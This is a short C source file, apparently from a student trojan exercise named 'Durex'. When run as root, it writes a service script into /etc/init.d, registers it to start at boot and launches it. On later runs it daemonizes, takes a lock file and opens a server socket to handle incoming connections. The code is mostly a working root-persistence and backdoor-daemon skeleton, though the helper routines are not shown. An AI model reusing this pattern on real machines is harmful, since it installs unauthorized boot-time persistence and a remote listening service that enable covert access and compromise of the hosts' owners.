#include <durex.h>
#include <curl/curl.h>

int8_t		g_nbr_connections;

uint8_t		copy_in_service(const char *durex_service)
{
	int	fd;

	fd = open("/etc/init.d/Durex", O_WRONLY | O_CREAT, 0700);
	if (fd == -1)
		return (0);
	write(fd, durex_service, ft_strlen(durex_service));
	close(fd);
	system("/usr/sbin/update-rc.d Durex defaults");
	return (1);
}


int		main(int ac, char **argv, char **env)
{
	int	fd_lock;
	int sock;

	(void)ac;
	(void)argv;
	if (getuid() != 0)
		return (0);
	ft_putstr(LOGIN);
	if (access("/etc/init.d/Durex", F_OK) == -1)
	{
		if (!copy_in_service(durex_service))
			return (0);
		execve("/usr/sbin/service", (char*[]){"service", "Durex", "start"}, NULL);
	}
	else
	{
		fd_lock = open("/var/lock/Durex.lock", O_CREAT | O_RDWR, 0644);
		if (flock(fd_lock, LOCK_EX | LOCK_NB) == -1)
			return (3);
		daemon(0, 1);
		if (!(sock = create_server()))
			return (0);
		handle_connection(sock, env);
	}
	return (0);
}
